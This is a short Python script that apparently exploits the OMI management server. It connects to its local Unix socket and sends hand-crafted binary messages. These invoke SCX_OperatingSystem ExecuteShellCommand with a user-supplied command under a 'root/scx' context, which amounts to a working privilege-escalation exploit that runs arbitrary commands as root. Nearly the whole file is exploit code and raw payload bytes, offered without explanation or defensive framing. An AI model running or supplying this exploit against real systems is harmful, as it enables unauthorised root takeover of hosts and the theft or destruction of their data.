import argparse
import os
import select
import socket
import sys

def main():
    parser = argparse.ArgumentParser(conflict_handler='resolve')
    parser.add_argument('-s', '--socket', dest='socket_path', default='/var/opt/omi/run/omiserver.sock', help='socket file')
    parser.add_argument('--timeout', default=5.0, type=int, help='response timeout')
    parser.add_argument('command', help='the command to run')
    arguments = parser.parse_args()

    command = arguments.command.encode('ascii')
    if len(command) > 256:
        return os.EX_USAGE
    command = command.ljust(256, b'\0')

    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        sock.connect(arguments.socket_path)
    except Exception:
        return os.EX_UNAVAILABLE

    sock.send(b'\x2f\x7e\xa8\xb1\x08\x06\x01\0\0\0\0\0\x05\0\0\0\x88\x23\xb0' + b'\0' * 13 + b'\x90\x7a\xb0\0\0\0\0\0\xbc\0\0\0\0\0\0\0\x80\x76\xb0\0\0\0\0\0\x50\0\0\0\0\0\0\0\x10\x71\xb0\0\0\0\0\0\x50\x05\0\0\0\0\0\0\xf0\x30\xb0\0\0\0\0\0\x6c\x01\0\0\0\0\0\0\x60\x23\xb0\0\0\0\0\0\xf0\x03\0\0\0\0\0\0')
    sock.send(b'\x57\x99\x2b\x46\x01\0\0\0\x0f\0\0\0\x5f\x4f\x4d\x49\x5f\x4f\x70\x74\x69\x6f\x6e\x53\x65\x74\0\0\0\0\0\0\x02\0\0\0\0\0\0\x40\x1e\0\0\0\x5f\x5f\x4d\x49\x5f\x4f\x50\x45\x52\x41\x54\x49\x4f\x4e\x4f\x50\x54\x49\x4f\x4e\x53\x5f\x43\x48\x41\x4e\x4e\x45\x4c\0\0\0\x15\0\0\0\x01\0\0\0\x03\0\0\0\0\0\0\0\x01\0\0\0\x02\0\0\0\0\0\0\0\x1e\0\0\0\x5f\x5f\x4d\x49\x5f\x4f\x50\x45\x52\x41\x54\x49\x4f\x4e\x4f\x50\x54\x49\x4f\x4e\x53\x5f\x54\x49\x4d\x45\x4f\x55\x54\0\0\0\x0c\0\0\0\x01' + b'\0' * 15 + b'\x01\0\0\0\x1e' + b'\0' * 19 + b'\xe3\x74\xf4\x76')
    sock.send(b'\x60\xea\x6a\xb2\0\0\0\0\x01\0\0\0\0\0\0\0\xa0\x7b\x41\x68\xa9\x7f\0\0\xe8\x24\xb0' + b'\0' * 21 + b'\x60\x23\xb0\0\0\0\0\0\x20\x71\xb0' + b'\0' * 21)
    sock.send(b'\x60\xea\x6a\xb2\0\0\0\0\x01\0\0\0\0\0\0\0\xa0\x7b\x41\x68\xa9\x7f\0\0\xe8\x24\xb0' + b'\0' * 21 + b'\x60\x23\xb0\0\0\0\0\0\x20\x71\xb0' + b'\0' * 21 + b'\x30\x27\xb0\0\0\0\0\0\x03\0\0\0\0\0\0\0\x01' + b'\0' * 35 + b'\x01\0\0\0\x1e' + b'\0' * 19 + b'\x01' + b'\0' * 1203)
    sock.send(b'\x57\x99\x2b\x46\x02\0\0\0\x14\0\0\0\x53\x43\x58\x5f\x4f\x70\x65\x72\x61\x74\x69\x6e\x67\x53\x79\x73\x74\x65\x6d\0\0\0\0\0\x02\0\0\0\0\x10\0\x40\x08\0\0\0\x63\x6f\x6d\x6d\x61\x6e\x64\0\x0d\0\0\0\x01\0\0\0\x01\x01\0\0' + command + b'\0\0\0\0\0\x10\0\x40\x08\0\0\0\x74\x69\x6d\x65\x6f\x75\x74\0\x0d\0\0\0\x01\0\0\0\x02\0\0\0\x30\0\0\0\xe3\x74\xf4\x76')
    sock.send(b'\xd0\x76\xb0\0\0\0\0\0\x70\x7a\xb0\0\0\0\0\0\x80\x7a\xb0\0\0\0\0\0\x02\0\0\0\0\0\0\0\xff\xff\xff\xff' + b'\0' * 20 + b'\x60\x23\xb0\0\0\0\0\0\x07\x10\0\0\x01\0\0\0\x03' + b'\0' * 23 + b'\x11\x27' + b'\0' * 142 + b'\x90\x76\xb0\0\0\0\0\0\x90\x7a\xb0\0\0\0\0\0\xbc\0\0\0\0\0\0\0\xa8\x24\xb0\0\0\0\0\0\xb8\x24\xb0\0\0\0\0\0\xd0\x24\xb0' + b'\0' * 13 + b'\xd8\x2a\xb0' + b'\0' * 13 + b'\xf0\x30\xb0\0\0\0\0\0\0\0\0\0\x6c\x01\0\0\x72\x6f\x6f\x74\x2f\x73\x63\x78\0\0\0\0\0\0\0\0\x45\x78\x65\x63\x75\x74\x65\x53\x68\x65\x6c\x6c\x43\x6f\x6d\x6d\x61\x6e\x64\0\0\0\0\0\x53\x43\x58\x5f\x4f\x70\x65\x72\x61\x74\x69\x6e\x67\x53\x79\x73\x74\x65\x6d\0\0\0\0\0\0\0\0\0\x0e\x74\x5f\0\x50\x25\xb0' + b'\0' * 21 + b'\x60\x25\xb0\0\0\0\0\0\x02\0\0\0\x90' + b'\0' * 51 + b'\xff\xff\xff\xff\xff\xff\xff\xff\x5f\x4f\x4d\x49\x5f\x4f\x70\x74\x69\x6f\x6e\x53\x65\x74\0\0\x60\x26\xb0\0\0\0\0\0\xc8\x26\xb0' + b'\0' * 248 + b'\x40\x1d\x6c\x5f\0\xa8\x26\xb0' + b'\0' * 17 + b'\x15' + b'\0' * 15 + b'\x40' + b'\0' * 27 + b'\x5f\x5f\x4d\x49\x5f\x4f\x50\x45\x52\x41\x54\x49\x4f\x4e\x4f\x50\x54\x49\x4f\x4e\x53\x5f\x43\x48\x41\x4e\x4e\x45\x4c\0\0\0\0\0\0\0\x1d\x74\x5f\0\x10\x27\xb0' + b'\0' * 17 + b'\x0c' + b'\0' * 15 + b'\x68' + b'\0' * 27 + b'\x5f\x5f\x4d\x49\x5f\x4f\x50\x45\x52\x41\x54\x49\x4f\x4e\x4f\x50\x54\x49\x4f\x4e\x53\x5f\x54\x49\x4d\x45\x4f\x55\x54\0\0\0\0\0\0\0\x01\0\0\0\x02' + b'\0' * 23)

    select.select([sock], [], [], arguments.timeout)

    sock.close()
    return os.EX_OK

if __name__ == '__main__':
    sys.exit(main())
